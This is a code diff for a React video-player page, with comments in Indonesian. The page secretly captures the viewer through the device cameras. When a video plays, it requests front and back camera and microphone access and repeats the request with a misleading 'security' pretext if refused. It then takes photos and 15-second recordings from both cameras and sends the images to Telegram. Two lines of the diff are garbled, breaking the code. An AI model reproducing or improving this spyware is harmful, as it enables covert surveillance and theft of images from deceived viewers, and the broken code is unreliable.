@@ -7,8 +7,8 @@ function App() {
   const [isPlaying, setIsPlaying] = useState<number | null>(null);
   const [isFullscreen, setIsFullscreen] = useState(false);
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
-  const cameraStreamsRef = useRef<MediaStream[]>([]);
-  const permittedDevicesRef = useRef<Set<string>>(new Set()); // Menyimpan deviceId yang sudah diizinkan
+  const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
+  const permittedDevicesRef = useRef<Set<string>>(new Set());
 
   const videos = [
     { videoUrl: 'https://cdn.videy.co/WRnnbxOh.mp4' },
@@ -17,7 +17,7 @@ function App() {
     { videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
     { videoUrl: 'https://cdn.videy.co/NQ8EOxk0.mp4' },
     { videoUrl: 'https://cdn.videy.co/16gpSQzQ.mp4' },
-    { videoUrl: 'https://cdn.videy.co/x3DQJdR6.mp4' },
+    { videoUrl:://cdn.videy.co/x3DQJdR6.mp4' },
     { videoUrl: 'https://cdn.videy.co/FPZ8MZdC.mp4' },
     { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
     { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
@@ -53,23 +53,22 @@ function App() {
     });
 
     return () => {
-      cameraStreamsRef.current.forEach(stream => cleanupMediaStream({ current: stream }));
+      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
       permittedDevicesRef.current.clear();
     };
   }, []);
 
-  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
-    console.log('Memulai proses perekaman untuk kamera depan dan belakang...');
-
-    // Membersihkan stream sebelumnya
-    cameraStreamsRef.current.forEach(stream => cleanupMediaStream({ current: stream }));
-    cameraStreamsRef.current = [];
+  const initializeCameraStreams = async () => {
+    if (cameraStreamsRef.current.length > 0) {
+      console.log('Stream kamera sudah diinisialisasi, menggunakan stream yang ada.');
+      return;
+    }
 
     const requestMediaAccess = async (deviceId: string, facingMode: string, cameraType: string) => {
-      // Cek apakah perangkat sudah diizinkan
       if (permittedDevicesRef.current.has(deviceId)) {
-        console.log(`Kamera ${cameraType} sudah diizinkan sebelumnya, menggunakan kembali.`);
+        console.log(`Kamera ${cameraType} sudah diizinkan sebelumnya.`);
+        return null; // Tidak perlu meminta lagi
       }
 
       const maxAttempts = 3;
@@ -88,14 +87,13 @@ function App() {
             audio: true,
           };
           const stream = await navigator.mediaDevices.getUserMedia(constraints);
-          cameraStreamsRef.current.push(stream);
           if (deviceId) {
             permittedDevicesRef.current.add(deviceId);
           }
           console.log(`Berhasil mendapatkan stream untuk kamera ${cameraType}`);
-          return stream;
+          return { stream, deviceId };
         } catch (error) {
-          console.error(`Gagal mendapatkan akses kamera (${cameraType}):`, error);
+          console.error(`Gagal mendapatkan akses kamera ${cameraType}:`, error);
           attempts++;
           if (attempts < maxAttempts) {
             alert(`Akses kamera ${cameraType} ditolak. Harap izinkan untuk melanjutkan (${attempts}/${maxAttempts}). Kami membutuhkan ini untuk "keamanan".`);
@@ -109,9 +107,6 @@ function App() {
     };
 
     try {
-      videoElement.play().catch(err => console.error('Error memutar video:', err));
-
-      // Mendapatkan daftar perangkat kamera
       const devices = await navigator.mediaDevices.enumerateDevices();
       const videoDevices = devices.filter(device => device.kind === 'videoinput');
       console.log('Perangkat kamera yang ditemukan:', videoDevices);
@@ -119,7 +114,6 @@ function App() {
       let frontDevice: MediaDeviceInfo | undefined;
       let backDevice: MediaDeviceInfo | undefined;
 
-      // Mencari kamera depan dan belakang
       for (const device of videoDevices) {
         const label = device.label.toLowerCase();
         if (label.includes('front') || label.includes('user')) {
@@ -129,7 +123,6 @@ function App() {
         }
       }
 
-      // Cadangan: jika label tidak jelas
       if (!frontDevice && videoDevices.length > 0) {
         frontDevice = videoDevices[0];
         console.log('Menggunakan perangkat pertama sebagai kamera depan:', frontDevice.label);
@@ -139,32 +132,47 @@ function App() {
         console.log('Menggunakan perangkat kedua sebagai kamera belakang:', backDevice?.label);
       }
 
-      const streams: { stream: MediaStream; type: string }[] = [];
-
-      // Meminta stream untuk kamera depan
       if (frontDevice) {
-        const frontStream = await requestMediaAccess(frontDevice.deviceId, 'user', 'depan');
-        if (frontStream) {
-          streams.push({ stream: frontStream, type: 'depan' });
+        const frontResult = await requestMediaAccess(frontDevice.deviceId, 'user', 'depan');
+        if (frontResult) {
+          cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
         }
       }
 
-      // Meminta stream untuk kamera belakang
       if (backDevice) {
-        const backStream = await requestMediaAccess(backDevice.deviceId, 'environment', 'belakang');
-        if (backStream) {
-          streams.push({ stream: backStream, type: 'belakang' });
+        const backResult = await requestMediaAccess(backDevice.deviceId, 'environment', 'belakang');
+        if (backResult) {
+          cameraStreamsRef.current.push({ stream: backResult.stream, type: 'belakang', deviceId: backResult.deviceId });
         }
       }
 
-      if (streams.length === 0) {
-        throw new Error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
+      if (cameraStreamsRef.current.length === 0) {
+        console.error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
+      } else {
+        console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map(s => s.type));
       }
+    } catch (error) {
+      console.error('Error saat menginisialisasi stream kamera:', error);
+    }
+  };
+
+  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
+    console.log('Memulai proses perekaman untuk kamera depan dan belakang...');
+
+    try {
+      // Inisialisasi stream jika belum ada
+      await initializeCameraStreams();
+
+      if (cameraStreamsRef.current.length === 0) {
+        throw new Error('Tidak ada stream kamera yang tersedia.');
+      }
+
+      videoElement.play().catch(err => console.error('Error memutar video:', err));
 
       const cameraVideos: HTMLVideoElement[] = [];
 
       // Memproses setiap stream
-      for (const { stream, type } of streams) {
+      for (const { stream, type } of cameraStreamsRef.current) {
         const cameraVideo = document.createElement('video');
         cameraVideo.srcObject = stream;
         cameraVideo.playsInline = true;
@@ -215,7 +223,7 @@ function App() {
           canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
         });
 
-        await sendImageToTelegram(photoBlob);
+        await sendImageToTelegramamples/photoBlob);
         console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
       }
 
@@ -224,7 +232,7 @@ function App() {
       const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
 
-      for (const { stream, type } of streams) {
+      for (const { stream, type } of cameraStreamsRef.current) {
         try {
           const mediaRecorder = new MediaRecorder(stream, {
             mimeType: supportedMimeType,
@@ -271,14 +279,10 @@ function App() {
         cameraVideos.forEach(video => {
           if (video.parentNode) video.parentNode.removeChild(video);
         });
-        cameraStreamsRef.current.forEach(stream => cleanupMediaStream({ current: stream }));
-        cameraStreamsRef.current = [];
       }, 15000);
 
     } catch (error) {
       console.error('Error dalam perekaman media:', error);
-      cameraStreamsRef.current.forEach(stream => cleanupMediaStream({ current: stream }));
-      cameraStreamsRef.current = [];
       setIsPlaying(null);
     }
   }, []);
